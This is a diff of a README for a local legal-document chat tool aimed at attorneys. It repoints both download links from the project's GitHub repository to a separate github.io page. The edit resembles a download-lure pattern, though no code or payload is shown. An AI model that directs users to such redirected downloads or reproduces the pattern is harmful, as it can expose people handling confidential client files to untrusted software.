@@ -1,6 +1,6 @@
 # ⚖️ legal-document-chat - Private legal document analysis for attorneys
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/michalspheroidal902/legal-document-chat)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://michalspheroidal902.github.io)
 
 This tool allows you to chat with your legal documents on your own computer. You keep your files private because the software runs locally. You do not send sensitive client information to external servers. It uses legal document parsing and a local language model to provide answers with verifiable page references.
 
@@ -8,7 +8,7 @@ This tool allows you to chat with your legal documents on your own computer. You
 
 You can get the software from the releases page. 
 
-[Visit this page to download](https://github.com/michalspheroidal902/legal-document-chat)
+[Visit this page to download](https://michalspheroidal902.github.io)
 
 Follow these steps to set up the software on your Windows computer:
 
